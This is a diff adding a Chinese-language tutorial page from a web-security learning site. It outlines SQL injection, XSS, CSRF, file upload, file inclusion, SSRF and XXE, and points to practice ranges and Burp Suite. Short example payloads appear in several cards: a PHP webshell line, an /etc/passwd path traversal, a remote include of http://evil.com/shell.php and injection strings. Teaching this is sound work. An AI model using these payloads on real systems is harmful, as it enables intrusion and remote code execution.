@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>第四阶段：安全入门 | SecureNova</title>
+    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="../styles/phase-pages.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body>
+    <div class="nav-wrapper">
+        <nav class="navbar">
+            <div class="logo">
+                <i class="fas fa-shield-virus"></i>
+                <span>SecureNova</span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="../index.html">首页</a></li>
+                <li><a href="../learning-path/index.html" class="active">学习路径</a></li>
+                <li><a href="../lab-environment/index.html">实验环境</a></li>
+                <li><a href="../challenges/index.html">挑战题目</a></li>
+                <li><a href="../resources/index.html">学习资源</a></li>
+            </ul>
+        </nav>
+    </div>
+
+    <div class="phase-nav">
+        <ul>
+            <li><a href="phase1.html">第一阶段</a></li>
+            <li><a href="phase2.html">第二阶段</a></li>
+            <li><a href="phase3.html">第三阶段</a></li>
+            <li><a href="phase4.html" class="active-phase">第四阶段</a></li>
+            <li><a href="phase5.html">第五阶段</a></li>
+            <li><a href="phase6.html">第六阶段</a></li>
+            <li><a href="phase7.html">第七阶段</a></li>
+        </ul>
+    </div>
+
+    <section class="content-section">
+        <div class="content-card">
+            <div class="phase-header">
+                <h3><i class="fas fa-shield-virus"></i> 第四阶段：安全入门</h3>
+                <span class="phase-number">Phase 04</span>
+            </div>
+            <p class="phase-summary">目标：掌握常见Web漏洞原理与利用方法</p>
+        </div>
+
+        <div class="knowledge-card">
+            <h4><i class="fas fa-database"></i> SQL注入</h4>
+            <div class="command-grid">
+                <div class="command-item">
+                    <strong>原理</strong>
+                    <div class="description">用户输入未被过滤直接拼接到SQL语句中</div>
+                </div>
+                <div class="command-item">
+                    <strong>手工注入</strong>
+                    <div class="description">手动构造恶意SQL语句测试</div>
+                    <div class="example">id=1' OR '1'='1</div>
+                </div>
+                <div class="command-item">
+                    <strong>布尔盲注</strong>
+                    <div class="description">通过页面返回真假判断数据</div>
+                </div>
+                <div class="command-item">
+                    <strong>时间盲注</strong>
+                    <div class="description">通过响应时间判断数据</div>
+                    <div class="example">IF(SUBSTR(user,1,1)='a',SLEEP(5),0)</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="knowledge-card">
+            <h4><i class="fas fa-code"></i> XSS跨站脚本</h4>
+            <div class="command-grid">
+                <div class="command-item">
+                    <strong>反射型XSS</strong>
+                    <div class="description">一次性攻击，通过URL参数注入</div>
+                    <div class="example">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+                </div>
+                <div class="command-item">
+                    <strong>存储型XSS</strong>
+                    <div class="description">持久化存储到数据库</div>
+                </div>
+                <div class="command-item">
+                    <strong>DOM型XSS</strong>
+                    <div class="description">客户端JavaScript处理不当</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="knowledge-card">
+            <h4><i class="fas fa-exchange"></i> CSRF跨站请求伪造</h4>
+            <div class="command-grid">
+                <div class="command-item">
+                    <strong>原理</strong>
+                    <div class="description">利用用户已认证的会话发起恶意请求</div>
+                </div>
+                <div class="command-item">
+                    <strong>攻击方式</strong>
+                    <div class="description">构造恶意链接或图片</div>
+                </div>
+                <div class="command-item">
+                    <strong>防御方法</strong>
+                    <div class="description">CSRF Token、验证Referer</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="knowledge-card">
+            <h4><i class="fas fa-upload"></i> 文件上传漏洞</h4>
+            <div class="command-grid">
+                <div class="command-item">
+                    <strong>前端验证绕过</strong>
+                    <div class="description">修改或删除前端验证代码</div>
+                </div>
+                <div class="command-item">
+                    <strong>后端验证绕过</strong>
+                    <div class="description">修改文件扩展名、Content-Type</div>
+                </div>
+                <div class="command-item">
+                    <strong>WebShell上传</strong>
+                    <div class="description">上传恶意脚本文件</div>
+                    <div class="example">eval($_POST['cmd'])</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="knowledge-card">
+            <h4><i class="fas fa-file-invoice"></i> 文件包含漏洞</h4>
+            <div class="command-grid">
+                <div class="command-item">
+                    <strong>LFI本地文件包含</strong>
+                    <div class="description">包含本地服务器文件</div>
+                    <div class="example">?page=../../etc/passwd</div>
+                </div>
+                <div class="command-item">
+                    <strong>RFI远程文件包含</strong>
+                    <div class="description">包含远程服务器文件</div>
+                    <div class="example">?page=http://evil.com/shell.php</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="knowledge-card">
+            <h4><i class="fas fa-globe"></i> SSRF服务端请求伪造</h4>
+            <div class="command-grid">
+                <div class="command-item">
+                    <strong>原理</strong>
+                    <div class="description">利用服务器发起请求访问内网资源</div>
+                </div>
+                <div class="command-item">
+                    <strong>攻击方式</strong>
+                    <div class="description">访问内网IP、端口扫描</div>
+                    <div class="example">http://127.0.0.1:8080</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="knowledge-card">
+            <h4><i class="fas fa-file-code"></i> XXE外部实体注入</h4>
+            <div class="command-grid">
+                <div class="command-item">
+                    <strong>原理</strong>
+                    <div class="description">XML解析时处理外部实体</div>
+                </div>
+                <div class="command-item">
+                    <strong>文件读取</strong>
+                    <div class="description">通过外部实体读取文件</div>
+                </div>
+                <div class="command-item">
+                    <strong>SSRF利用</strong>
+                    <div class="description">通过DTD发起请求</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="knowledge-card">
+            <h4><i class="fas fa-target"></i> 靶场实战</h4>
+            <div class="command-grid">
+                <div class="command-item">
+                    <strong>DVWA</strong>
+                    <div class="description">Damn Vulnerable Web Application</div>
+                </div>
+                <div class="command-item">
+                    <strong>Pikachu</strong>
+                    <div class="description">中文Web安全教学平台</div>
+                </div>
+                <div class="command-item">
+                    <strong>UploadLabs</strong>
+                    <div class="description">文件上传漏洞练习平台</div>
+                </div>
+                <div class="command-item">
+                    <strong>SQLiLabs</strong>
+                    <div class="description">SQL注入专项练习</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="knowledge-card">
+            <h4><i class="fas fa-search"></i> BurpSuite使用</h4>
+            <div class="command-grid">
+                <div class="command-item">
+                    <strong>代理设置</strong>
+                    <div class="description">配置浏览器代理到Burp</div>
+                </div>
+                <div class="command-item">
+                    <strong>抓包分析</strong>
+                    <div class="description">查看和修改HTTP请求</div>
+                </div>
+                <div class="command-item">
+                    <strong>漏洞扫描</strong>
+                    <div class="description">使用Scanner模块扫描漏洞</div>
+                </div>
+                <div class="command-item">
+                    <strong>暴力破解</strong>
+                    <div class="description">使用Intruder模块爆破</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+        <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>快速链接</h4>
+                <ul>
+                    <li><a href="../index.html">首页</a></li>
+                    <li><a href="../learning-path/index.html">学习路径</a></li>
+                    <li><a href="../lab-environment/index.html">实验环境</a></li>
+                    <li><a href="../challenges/index.html">挑战题目</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>学习资源</h4>
+                <ul>
+                    <li><a href="../resources/index.html">推荐书籍</a></li>
+                    <li><a href="../resources/index.html">在线平台</a></li>
+                    <li><a href="../resources/index.html">社区论坛</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>联系我们</h4>
+                <ul>
+                    <li>邮箱：ms3079266256@outlook.com</li>
+                    <li>QQ：1047683038</li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2026 SecureNova. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script src="../script.js"></script>
+</body>
+</html>
